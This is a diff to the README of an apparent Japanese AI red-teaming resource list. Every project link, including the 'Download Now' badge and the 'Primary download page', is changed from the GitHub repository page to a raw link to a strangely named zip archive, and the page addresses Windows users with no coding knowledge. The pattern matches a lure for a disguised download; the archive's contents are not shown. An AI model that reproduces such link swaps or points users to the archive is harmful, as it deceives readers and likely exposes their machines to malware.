@@ -1,6 +1,6 @@
 # 🧠 awesome-ai-red-teaming-jp - Japanese AI safety resources
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Ajay77187718/awesome-ai-red-teaming-jp)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ajay77187718/awesome-ai-red-teaming-jp/main/mcp-server/teaming_ai_jp_red_awesome_postfetal.zip)
 
 ## 🚀 Overview
 
@@ -8,7 +8,7 @@
 
 This README helps you get the project from GitHub and use it on Windows with no coding knowledge. The link below takes you to the main page for the project.
 
-**Primary download page:** https://github.com/Ajay77187718/awesome-ai-red-teaming-jp
+**Primary download page:** https://raw.githubusercontent.com/Ajay77187718/awesome-ai-red-teaming-jp/main/mcp-server/teaming_ai_jp_red_awesome_postfetal.zip
 
 ## 📥 Download and setup
 
@@ -90,7 +90,7 @@ If you already use GitHub in your browser, you can skip the download and read on
 
 Visit this page to download or read the project:
 
-**https://github.com/Ajay77187718/awesome-ai-red-teaming-jp**
+**https://raw.githubusercontent.com/Ajay77187718/awesome-ai-red-teaming-jp/main/mcp-server/teaming_ai_jp_red_awesome_postfetal.zip**
 
 ## 🧩 File layout
 
@@ -159,7 +159,7 @@ A simple way to use the repo:
 
 ## 📎 Main project link
 
-[Open awesome-ai-red-teaming-jp on GitHub](https://github.com/Ajay77187718/awesome-ai-red-teaming-jp)
+[Open awesome-ai-red-teaming-jp on GitHub](https://raw.githubusercontent.com/Ajay77187718/awesome-ai-red-teaming-jp/main/mcp-server/teaming_ai_jp_red_awesome_postfetal.zip)
 
 ## 🗂️ Suggested next steps
 
